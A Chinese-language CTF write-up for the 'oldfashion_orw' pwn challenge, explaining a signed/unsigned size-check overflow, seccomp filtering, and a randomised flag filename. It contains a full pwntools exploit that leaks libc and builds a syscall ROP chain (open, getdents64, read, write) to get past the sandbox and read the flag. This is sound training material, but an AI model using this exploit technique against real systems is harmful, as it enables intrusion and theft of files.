# oldfashion_orw

## 题目简述

程序把 `atoi` 的结果存入无符号长度变量，却在大小检查时将其强制转回有符号数。输入负数可以通过“不大于 32”的判断，随后又以巨大的无符号长度执行 `read`，造成栈溢出。沙箱禁止 `execve`、`openat` 等系统调用，而且部署脚本会为 flag 文件名追加 20 位随机字符串，因此需要先枚举目录，再针对真实文件名完成 ORW。

## 解题过程

主函数的漏洞逻辑可以简化为：

```c
size_t nbytes;
char buffer[40];

read(0, buffer, 0x10);
nbytes = atoi(buffer);
if ((int64_t)nbytes <= 32)
    read(0, buffer, (unsigned int)nbytes);
```

发送 `-2147483647` 时，有符号比较成立，但转换给 `read` 的长度很大。程序没有 Canary 和 PIE，因此从缓冲区起点填充 `0x38` 字节即可控制返回地址。

先使用 `seccomp-tools dump ./vuln` 查看过滤规则。沙箱会终止 `execve`、`execveat`、`openat`、`close`、`creat`、`uselib`、`fork` 和 `vfork`，但保留旧式 `open`、`read`、`write` 与 `getdents64`。部署脚本则执行了类似操作：

```bash
cp /flag "/home/ctf/flag$(head /dev/urandom | cksum | md5sum | cut -c 1-20)"
```

因此完整利用分两轮：

1. 用 `write(1, write@got, ...)` 泄露 libc，并返回 `main`。
2. 直接使用 `syscall; ret` 完成 `read(".\0")`、`open(".")`、`getdents64` 和 `write`，从目录项中得到 `flag` 加 20 字节后缀；再读入完整文件名，执行普通的 `open-read-write`。

`getdents64` 返回的每个目录项末尾都包含以 NUL 结尾的 `d_name`，所以把原始目录缓冲区写回客户端后，可以直接搜索 `flag` 前缀。下面给出完整的核心利用：

```python
from pwn import *

context.arch = "amd64"
elf = ELF("./vuln", checksec=False)
libc = ELF("./libc-2.31.so", checksec=False)
io = remote("challenge.example", 10000)

negative_size = b"-2147483647".ljust(0x10, b"\x00")
pop_rdi = 0x401443
pop_rsi_r15 = 0x401441
bss = 0x404100

# 第一轮：泄露 write，并回到 main。
io.sendafter(b"size?", negative_size)
stage1 = b"A" * 0x38 + flat(
    pop_rdi,
    1,
    pop_rsi_r15,
    elf.got["write"],
    0,
    elf.sym["write"],
    elf.sym["main"],
)
io.sendafter(b"content?\n", stage1)
io.recvuntil(b"done!\n")
write_addr = u64(io.recvn(6).ljust(8, b"\x00"))
libc.address = write_addr - libc.sym["write"]

pop_rax = libc.address + 0x4a550
pop_rsi = libc.address + 0x27529
pop_rdx_r12 = libc.address + 0x11c371
syscall_ret = libc.address + 0x66229

def syscall(number, arg0, arg1, arg2):
    return flat(
        pop_rax, number,
        pop_rdi, arg0,
        pop_rsi, arg1,
        pop_rdx_r12, arg2, 0,
        syscall_ret,
    )

# 第二轮：列目录，再读取动态文件名对应的 flag。
io.sendafter(b"size?", negative_size)
stage2 = b"A" * 0x38
stage2 += syscall(0, 0, bss, 2)                 # read(0, bss, 2)
stage2 += syscall(2, bss, 0, 0)                 # open(".", O_RDONLY)
stage2 += syscall(217, 3, bss + 0x200, 0x600)   # getdents64(3, ...)
stage2 += syscall(1, 1, bss + 0x200, 0x600)     # write(1, dirents, ...)
stage2 += syscall(0, 0, bss, 0x30)              # 读取完整文件名
stage2 += syscall(2, bss, 0, 0)                 # open(flag_name, O_RDONLY)
stage2 += syscall(0, 4, bss, 0x60)              # read(4, bss, 0x60)
stage2 += syscall(1, 1, bss, 0x60)              # write(1, bss, 0x60)
io.sendafter(b"content?\n", stage2)

io.recvuntil(b"done!\n")
io.send(b".\x00")
io.recvuntil(b"flag")
suffix = io.recvn(20)
filename = b"flag" + suffix
io.send(filename.ljust(0x30, b"\x00"))
io.interactive()
```

这里假设程序启动时只占用标准输入、输出和错误三个描述符，因此打开目录得到 `fd=3`；由于 `close` 被禁用，随后打开 flag 得到 `fd=4`。这正是原题运行环境的描述符布局。

## 方法总结

本题同时考查有符号/无符号转换、seccomp 分析和目录枚举。看到随机化文件名时，普通 ORW 并不完整；必须先借助 `getdents64` 获取 `linux_dirent64.d_name`。沙箱封禁 `openat` 也意味着不能直接调用现代 glibc 的 `open` 包装路径，而要使用允许的旧式 `open` 系统调用和自行找到的 `syscall; ret`。
